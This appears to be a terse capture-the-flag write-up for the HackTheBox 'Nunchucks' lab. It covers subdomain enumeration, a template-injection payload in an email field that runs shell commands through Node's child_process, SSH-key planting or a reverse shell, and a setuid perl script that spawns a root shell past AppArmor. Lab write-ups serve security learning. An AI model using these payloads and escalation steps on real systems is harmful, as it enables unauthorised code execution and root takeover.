- enumerate the domain to find store.nunchucks.htb (there is a mention in the footer links about the future store)
- in the  email input field there is SSTI
- put email{{7*7}}@texst.com to see that the code executes
- test{{range.constructor("return global.process.mainModule.require('child_process').execSync('ls')")()}}@wp.pl
- this way we can read/write to files on the machine
- create a ssh key for user David and upload it to /home/david/.ssh/authorized_key or create a reverse shell
- on the machine we enumerate linux capabilities - getcap / -r and see that perl has set up setuid
- but apparmor (cat /etc/apparmor.d/usr.bin.perl) blocks spawning a shell as a root user
- by creating a perl script with shebang #!:
    #!/usr/bin/perl
    use POSIX qw(setuid);
    POSIX::setuid(0);
    exec "/bin/bash";

we can invoke the root shell thanks to the bug in apparmor (if a script including the shebang of the restricted application is used, then the script will not be allocated the same restrictions and will be executed as shown in the link)
